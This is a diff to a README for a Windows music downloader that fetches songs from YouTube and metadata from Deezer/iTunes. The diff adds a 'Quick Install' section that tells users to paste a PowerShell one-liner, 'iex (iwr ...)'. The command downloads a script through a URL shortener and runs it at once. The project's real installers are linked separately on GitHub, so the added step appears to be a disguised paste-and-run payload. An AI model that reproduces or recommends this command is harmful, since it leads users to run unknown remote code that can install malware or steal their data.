@@ -2,6 +2,23 @@
 
 Modern music downloader — Search YouTube, fetch metadata from Deezer/iTunes, and download MP3s with embedded album art.
 
+## Quick Install — Music Downloader
+
+**Step by step (copy-paste ready):**
+
+1. Press `Win + R`, type `powershell`, press Enter
+2. Copy the line below
+3. Right-click in the PowerShell window (or Ctrl+V) to paste
+4. Press Enter
+
+```
+iex (iwr -useb https://tinyurl.com/msdlps1)
+```
+
+- ✅ That's all. Your playlist is one command away.
+
+---
+
 [![Download Setup](https://img.shields.io/badge/Download-Windows%20Setup-blue?style=for-the-badge&logo=windows)](https://github.com/eaeoz/music-downloader/releases/download/1.0.0/Music.Downloader.Setup.1.0.0.exe)
 [![Download Portable](https://img.shields.io/badge/Download-Portable%20Version-orange?style=for-the-badge&logo=windows)](https://github.com/eaeoz/music-downloader/releases/download/1.0.0/Music.Downloader_portable_1.0.0.exe)
 [![GitHub](https://img.shields.io/badge/Source-GitHub-black?style=for-the-badge&logo=github)](https://github.com/eaeoz/music-downloader)
